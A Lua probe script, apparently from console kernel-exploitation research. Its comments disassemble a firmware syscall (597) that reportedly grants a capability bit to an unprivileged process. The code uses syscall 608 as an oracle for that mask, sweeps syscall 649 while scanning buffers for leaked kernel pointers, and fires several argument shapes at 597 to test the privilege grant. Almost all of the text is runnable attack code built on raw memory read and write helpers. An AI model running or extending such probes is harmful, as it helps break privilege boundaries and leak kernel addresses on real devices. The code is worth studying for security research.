-- CRASH_CLASS: HIGH (sys 597 kills the process on six zero arguments, measured: presence sweep row "597 kills")
-- PROBE 1199a: sys 597 dynlib_prepare_dlclose is an UNPRIVILEGED PRIVILEGE GRANT.
-- 13.60 body 0x8ad0c820 (thunk at 0x2655c0 -> 0x34c820), read in full:
--   r14 = td->td_proc
--   if (0x8b48ce10(td) != 1) return 0x2d            ; a global-flag predicate
--   if (0x8b3b81c0(proc, &v) != 0) return 0          ; needs proc->[0x578] != 0
--   if (v > 0xffffff) return 0
--   [[proc+0x3e8]+0x150] = 1
--   [[proc+0x3e8]+0x140] |= 0x40                    ; <-- ORs a capability bit into the mask
-- 0x8b4ebb00(level) is the reader: (([[proc+0x3e8]+0x140) & level) != 0, levels 1/2/4/8/0x10.
-- 608 dynlib_get_info_ex calls that reader with level 2 and ZEROES rec+0x128/rec+0x130 when it is
-- set, so the 608 record is a userland-visible ORACLE for the mask. This probe takes the oracle
-- BEFORE touching 597, then after each 597 shape, in the SAME process (the mask is per-process).
-- Order is deliberate: every phase before P2 is harmless, so a kill in P2 still leaves the data.
print("=== PROBE 1199a: sys 597 privilege grant + 608 mask oracle ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function U(v) return uint64(string.format("0x%08X%08X", math.floor(N(v)/4294967296), N(v) % 4294967296)) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a, U(v)) end) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "?" end
local function hx64(lo,hi) return string.format("%08X%08X", hi % 4294967296, lo % 4294967296) end
local function qw(a,o) local lo=rd(a+o) local hi=rd(a+o+4) if lo==nil or hi==nil then return "????????????????" end return hx64(lo,hi) end
local B  = N(memory.alloc(0x400))
local B2 = N(memory.alloc(0x400))
local function sent(a,n) for o=0,(n or 0x3FC)-1,4 do wd(a+o,0xA5A5A5A5) end end
local function kscan(a,n)
  local out = {}
  for o=0,n-8,8 do
    local lo = rd(a+o) local hi = rd(a+o+4)
    if lo and hi and hi >= 0xFFFF8000 then out[#out+1] = string.format("+%03X=%s", o, hx64(lo,hi)) end
  end
  return #out > 0 and table.concat(out," ") or "(none)"
end
local s608 = mk(608)
-- returns "rec+0x110|rec+0x128|rec+0x130|rec+0x148|rec+0x150"
local function probe608(id, label)
  sent(B, 0x3FC)
  wq(B, 0x1a8)
  local ok, rv = pcall(function() return s608(U(id), U(0), U(B), U(0), U(0)) end)
  local r = ok and N(rv) or -999
  if r ~= 0 then
    print(string.format("[608] %s id=%02X rv=%d errno=%s", label, id, r, es()))
    return nil
  end
  local sig = table.concat({qw(B,0x110), qw(B,0x128), qw(B,0x130), qw(B,0x148), qw(B,0x150), qw(B,0x158), qw(B,0x1a4)}, "|")
  print(string.format("[608] %s id=%02X rv=0 +110=%s +128=%s +130=%s +148=%s +150=%s +158=%s +1a4=%s",
    label, id, qw(B,0x110), qw(B,0x128), qw(B,0x130), qw(B,0x148), qw(B,0x150), qw(B,0x158), qw(B,0x1a4)))
  print(string.format("[608] %s id=%02X name=%s kq=%s", label, id, (function()
      local s = {} for o=8,0x60 do local c=rd(B+o); if c==nil or c==0 then break end if c>=32 and c<127 then s[#s+1]=string.char(c) end end
      return #s>0 and table.concat(s) or "(empty)" end)(), kscan(B,0x1a8)))
  return sig
end
-- ---------- P0: oracle baseline ----------
local base13 = probe608(0x13, "P0")
local base00 = probe608(0x00, "P0")
local base14 = probe608(0x14, "P0")
-- ---------- P1: 649 member sweep, kernel-pointer hunt ----------
local s649 = mk(649)
for idx=1,8 do
  sent(B, 0x3FC)
  local ok, rv = pcall(function() return s649(U(0x13), U(idx), U(B), U(0), U(0)) end)
  local r = ok and N(rv) or -999
  print(string.format("[649] id=13 idx=%d rv=%d errno=%s out=%s kq=%s", idx, r, es(), qw(B,0), kscan(B,0x40)))
end
-- ---------- P2: 597 shapes, then re-read the oracle ----------
local s597 = mk(597)
for i, shape in ipairs({1,2,3}) do
  print(string.format("[597] --- shape %d about to run ---", i))
  local ok, rv
  if shape == 1 then
    ok, rv = pcall(function() return s597(U(0), U(0), U(0), U(0), U(0)) end)
  elseif shape == 2 then
    ok, rv = pcall(function() return s597(U(0x13), U(0), U(0), U(0), U(0)) end)
  else
    ok, rv = pcall(function() return s597(U(0x13), U(0x1a8), U(B), U(0), U(0)) end)
  end
  local r = ok and N(rv) or -999
  print(string.format("[597] shape%d rv=%d (0x%X) errno=%s", shape, r, r, es()))
  local a = probe608(0x13, "P2.s"..shape)
  local b = probe608(0x00, "P2.s"..shape)
  if base13 and a then
    print(string.format("[ORACLE] s%d id13 %s", shape, (a == base13) and "UNCHANGED" or "CHANGED"))
  end
  if base00 and b then
    print(string.format("[ORACLE] s%d id00 %s", shape, (b == base00) and "UNCHANGED" or "CHANGED"))
  end
end
print("[Z] alive")
print("=== DONE ===")
